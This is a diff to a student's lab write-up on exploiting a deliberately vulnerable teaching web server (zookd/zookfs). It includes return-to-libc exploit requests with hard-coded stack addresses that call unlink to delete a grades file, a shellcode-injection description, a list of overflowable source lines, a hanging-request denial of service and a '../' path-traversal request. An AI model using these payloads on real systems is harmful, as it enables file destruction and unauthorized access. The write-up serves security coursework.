@@ -50,3 +50,86 @@
 		Here, we do the exploit similar to the part-a of Exercise-2.
 		zookfs.c calls the function http_serve(), an overflow can happen to the pn, if the sizeof(pn+name) before excuting the line 274 exceeds 1024. 
 		We inject the shellcode in the request, so pn starts with the shellcode, as we know the address of pn(got while debugging using gdb), we overwrite the handler ptr to start at the shellcode.Now that the handler is overwritten with the shellcode the file 'grades.txt' gets deleted.
+
+
+---------------------------------Exercise--4 ------------------------------------------------------------------
+
+	
+[exploit-4a.py]
+	
+	Added Code:
+
+		string_addr = 0x804d4c1
+		handler_safety = 0x804963d
+    	unlink_addr = 0x40102450
+
+    	req =   "GET /" + "A" * 1008 + struct.pack("<I", handler_safety) + "A"*12 + struct.pack("<I", unlink_addr) +"A"*4+ struct.pack("<I", string_addr) + "/home/httpd/grades.txt"+ " HTTP/1.0\r\n" + \
+            "\r\n"
+	    return req
+
+
+	Deleting the file '/home/httpd/grades.txt' :
+
+		zookfs.c calls the function http_serve(), an overflow can happen to the pn, if the sizeof(pn+name) before excuting the line 274 exceeds 1024.Handler is overwritten and as well as the return address. To prevent over-writing handler, we actually replace the earlier address(which was obtained while debugging using gdb) so that handler is not overwritten.Now the return address is directed to unlink_addr(which was obtained while debugging using gdb) and the argument for the unlink syscall is placed after the ret_addr
+	
+
+[exploit-4b.py]
+
+	Added Code:
+
+		stack_buffer = 0xbfffcdc0
+	    unlink_addr = 0x40102450
+    	regi = 0x0
+    	envp_safe = 0xbfffe608
+    	string_addr = 0xbfffddaa
+    	string_path = "/home/httpd/grades.txt"
+    	
+    	req =   "GET /"+ "A"*( 4096 - 5 - len(string_path) ) + string_path + struct.pack("<I", regi) + struct.pack("<I", regi) + struct.pack("<I", regi) + struct.pack("<I", envp_safe) + "A"*12 + struct.pack("<I", unlink_addr) +"A"*4+ struct.pack("<I", string_addr)  +" HTTP/1.0\r\n" + \
+            "\r\n"
+    	
+    	return req
+
+	
+	Deleting the file '/home/httpd/grades.txt' :
+
+		process_client() function of zookd.c calls the function http_request_line().The pointers envp,sp1,sp2,qp can be made to access a bad location when buf overflows(sizeof(buf) > 4096).So, we have re-written their actual values in the stack by doing the overflow in the mentioned way.Now the return address is directed to unlink_addr(which was obtained while debugging using gdb) and the argument for the unlink syscall is placed after the ret_addr 
+
+
+
+				[-------------- For the bugs in Exercise-1 -----------------]
+
+
+	[http.c:65]  
+				This can be exploited in the same way by directing ret_addr to unlink
+
+	[http.c:87] 
+				This cannot be exploited since the pointer envp can be made to access a bad location when buf overflows.This cannot be used directly
+
+	[http.c:121]
+				This can be exploited in the same way by directing ret_addr to unlink
+
+	[http.c:304]
+				This can be exploited in the same way by directing ret_addr to unlink
+
+	[http.c:274] 
+				This vulnerability is exploited in exploit-4a
+
+	[zookld.c:203]
+				This is a vulnerability which cannot be exploited as above, because the array is static(static variables are not present on the stack), thus return address cannot be exploited
+
+
+----------------------------------Exercise--5 ------------------------------------------------------------------
+
+	DOS(Denial Of Service) Attack:
+
+		Suppose consider this HTTP request  (exploit-5a.py)
+			"GET" 
+		Here the server waits for the input and nothing happens to terminate or exit this.We need to add some extra condition to verify and rectify the requests like this one, this can be rectified by verifing for meaningless requests or checking for the requests which don't have trailing newline.
+
+
+	Accessing the files(which shouldn't be accessible otherwise):
+	
+		Suppose consider this HTTP request  (exploit-5b.py) 
+		"GET /../lab/http.c HTTP/1.0\r\n" + \
+            "\r\n"
+		zookfs.c calls the function http_serve(), here the handler uses the module http_serve_file(), here there are no checks to make sure the files are not accessible. 
